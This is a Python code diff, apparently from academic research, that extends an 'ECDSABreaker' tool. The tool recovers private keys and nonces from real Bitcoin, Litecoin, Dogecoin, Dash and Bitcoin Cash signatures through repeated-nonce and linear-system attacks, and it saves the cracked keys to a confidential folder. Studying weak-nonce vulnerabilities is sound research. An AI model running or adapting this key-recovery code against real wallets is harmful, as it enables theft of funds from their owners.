@@ -1,3 +1,4 @@
+import os
 import ecdsa
 from ecdsa.curves import Curve
 from keys_recovery.SignatureDB import SignatureDB, SignatureFolder
@@ -5,6 +6,7 @@ from keys_recovery.ecdsa_helper import (
     derive_nonce_from_known_private_key,
     derive_private_key_from_known_nonce,
     derive_private_key_from_repeated_nonces,
+    solve_for_all_alterations,
 )
 import logging
 
@@ -14,12 +16,11 @@ logging.basicConfig(encoding="utf-8", level=logging.DEBUG)
 
 class ECDSABreaker:
     def __init__(
-        self,
-        signature_folders: list[SignatureFolder],
-        curve: Curve,
+        self, signature_folders: list[SignatureFolder], curve: Curve, out_folder: str
     ) -> None:
         self.db = SignatureDB(signature_folders, curve=curve)
         self.curve = curve
+        self.out_folder = out_folder
 
     def crack(self):
         logger.info("ROUND 0: Derive nonces and private keys from repeated nonces")
@@ -29,6 +30,18 @@ class ECDSABreaker:
             "ROUND 1: Derive nonces from known private keys and private keys from known nonces"
         )
         self.__crack_from_known_nonces_and_keys()
+
+        logger.info(
+            "ROUND 2: Derive nonces and private keys from signatures that form a system of linear equations."
+        )
+        self.__crack_from_sig_equation_system()
+
+        logger.info(
+            "ROUND 3: Derive nonces from known private keys and private keys from known nonces"
+        )
+        self.__crack_from_known_nonces_and_keys()
+
+        self.db.save_addresses(os.path.join(self.out_folder, "addresses.parquet"))
 
     def __crack_repeated_nonces(self):
         repeated_nonces_df = self.db.find_repeated_nonces()
@@ -75,27 +88,80 @@ class ECDSABreaker:
             crackable_keys, crackable_nonces = self.db.get_crackable_keys_and_nonces()
 
     def __crack_from_sig_equation_system(self):
+        def build_system_matrix(rows, pubkeys: list[str], r: list[int]):
+            if len(rows) % 2:
+                raise ValueError("The number of signatures should be even.")
+            if len(pubkeys) != len(r) or len(pubkeys) * 2 != len(rows):
+                raise ValueError(
+                    "The number of public keys and distinct 'r' values should be equal to the half of the number of signatures."
+                )
+
+            pk_to_pos = {pk: i for i, pk in enumerate(pubkeys)}
+            r_to_pos = {r_val: i for i, r_val in enumerate(r)}
+            dim = len(pubkeys) * 2
+            m = [[0 for _ in range(dim)] for _ in range(dim)]
+            b = []
+
+            for i, tuple in enumerate(rows.itertuples()):
+                pk, r_val, s, h = (tuple.pubkey, tuple.r, tuple.s, tuple.h)
+                m[i][r_to_pos[r_val]] = s
+                m[i][pk_to_pos[pk] + dim // 2] = -r_val % ecdsa.SECP256k1.order
+                b.append(h)
+
+            return m, b
+
         cycle_signatures = self.db.get_cycle_signatures()
+        cycle_signatures = cycle_signatures.set_index(keys="cycle_id")
+
+        for id in sorted(cycle_signatures.index.unique()):
+            rows = cycle_signatures.loc[:].loc[id]
+            pubkeys = rows["pubkey"].unique()
+            r = rows["r"].unique()
+            m, b = build_system_matrix(rows, pubkeys, r)
+            nonces, private_keys = solve_for_all_alterations(m, b, pubkeys, r)
+
+            rows["privkey"] = rows.apply(
+                lambda row: private_keys[row["pubkey"]], axis=1
+            )
+            rows["vulnerable_timestamp"] = rows["block_timestamp"].max()
+            r_chain = (
+                rows.iloc[0].chain
+                if rows["chain"].nunique() == 1
+                else rows["chain"].unique()
+            )
+            rows["r_chain"] = r_chain
+            self.db.expand_cracked_keys(rows)
+
+            rows["nonce"] = rows.apply(lambda row: nonces[row["r"]], axis=1)
+            self.db.expand_known_nonce(rows)
+
+        cycle_signatures.reset_index()
 
 
 if __name__ == "__main__":
     signature_folders = [
         SignatureFolder(
-            "/Users/vincent/Documents/PhD/Blockchains/UTXO/ecdsa-signatures/data/new_signatures_formatted/bch",
+            "/Users/vincent/Documents/PhD/Blockchains/UTXO/ecdsa-signatures/data/signatures/bch",
         ),
         SignatureFolder(
-            "/Users/vincent/Documents/PhD/Blockchains/UTXO/ecdsa-signatures/data/new_signatures_formatted/btc"
+            "/Users/vincent/Documents/PhD/Blockchains/UTXO/ecdsa-signatures/data/signatures/btc"
         ),
         SignatureFolder(
-            "/Users/vincent/Documents/PhD/Blockchains/UTXO/ecdsa-signatures/data/new_signatures_formatted/dash"
+            "/Users/vincent/Documents/PhD/Blockchains/UTXO/ecdsa-signatures/data/signatures/dash"
         ),
         SignatureFolder(
-            "/Users/vincent/Documents/PhD/Blockchains/UTXO/ecdsa-signatures/data/new_signatures_formatted/ltc"
+            "/Users/vincent/Documents/PhD/Blockchains/UTXO/ecdsa-signatures/data/signatures/ltc"
         ),
         SignatureFolder(
-            "/Users/vincent/Documents/PhD/Blockchains/UTXO/ecdsa-signatures/data/new_signatures_formatted/doge"
+            "/Users/vincent/Documents/PhD/Blockchains/UTXO/ecdsa-signatures/data/signatures/doge"
         ),
     ]
 
-    breaker = ECDSABreaker(signature_folders, ecdsa.SECP256k1)
+    out_folder = "/Users/vincent/Documents/PhD/Blockchains/UTXO/ecdsa-signatures/data/confidential"
+
+    breaker = ECDSABreaker(
+        signature_folders,
+        ecdsa.SECP256k1,
+        out_folder,
+    )
     breaker.crack()
